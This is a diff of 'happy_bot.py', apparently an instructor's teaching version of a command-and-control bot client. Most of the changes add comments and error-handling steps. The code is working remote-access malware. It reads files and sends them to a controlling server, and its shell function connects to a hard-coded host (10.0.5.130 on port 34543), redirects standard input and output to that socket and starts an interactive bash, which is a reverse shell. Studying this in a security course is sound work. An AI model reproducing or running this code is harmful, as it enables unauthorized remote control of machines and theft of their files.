@@ -2,15 +2,15 @@
 ## Name: Robert Hendrickson
 ## ID:   instructor05
 ## CREATED: 10-07-2021
-## UPDATED: 11-01-2021--11:29AM
+## UPDATED: 11-10-2021--06:01AM
 ## FILE: happy_bot.py
 ################################
 """
 This program will create a bot and call to a server for commands
-USAGE: ~$ python3 Hendrickson_Minoin.py
+USAGE: ~$ python3 happy_bot.py
 socket module used for send/receive to server
 subprocess module used to send commands to system
-re module/happy_little_searcher used to find files on system
+re module/happy_search used to find files on system
 os module used to walk through filesystem
 getpass module required to get the username of the client connection
 sys module used for exit and sys.platform
@@ -24,7 +24,6 @@ import os
 import getpass
 import sys
 import time
-import datetime
 
 # we gather the starting location to use when we search for a file later
 start_loc = os.getcwd()
@@ -80,10 +79,17 @@ def download(socket, delimiter):
         with open(filename, 'r') as handle:
             data = handle.read()
     except Exception as e:
-        # Set up the message to send to the server
+        # Get the error type for an exception
         typee = str(type(e)).split()[1].split('>')[0]
+        # Format the error message and type for sending to the server
         data = '[!] ERROR TYPE: {} \n    --ERROR:{}'.format(typee,str(e))
+        # Encode the message as bytes
         data = data.encode()
+        #send the message to the server
+        mysendall(socket, data, delimiter)
+        # The next three steps are for syncing client/server
+        myrecvall(socket, delimiter).decode()
+        data = b'[!] Client download failed'
         mysendall(socket, data, delimiter)
     else:
         # If no error we will save the base64 encoded file to a variable
@@ -198,22 +204,27 @@ def search(socket, delimiter):
 
 def shell(mysocket, delimiter):
     """
-    This will do something
+    This will receive a call back from the client with a terminal from a linux client
+    :mysocket: The original connection that was used to communicate
     """
     try:
         if sys.platform.startswith('win'):
             data = b"[!] --HAL9000:I'm sorry I can't do that Dave.\n--Dave: Open the pod bay doors HAL!"
             mysendall(mysocket, data, delimiter)
-            myrecvall(mysocket, delimiter)
+            myrecvall(mysocket, delimiter).decode()
+            data = b'[!] We need more lemon pledge'
+            mysendall(mysocket, data, delimiter)
         elif sys.platform.startswith('linux'):
             data = b'[!] Client received shell request'
             mysendall(mysocket, data, delimiter)
             time.sleep(1)
             s = socket.socket()
             s.connect(('10.0.5.130', 34543))
+            # We duplicate the standard out, in and error
             os.dup2(s.fileno(),0)
             os.dup2(s.fileno(),1)
             os.dup2(s.fileno(),2)
+            # we call the 
             subprocess.call(['/bin/bash', '-i'])
             myrecvall(mysocket, delimiter)
             data = b'[!] Client Shell Finished'
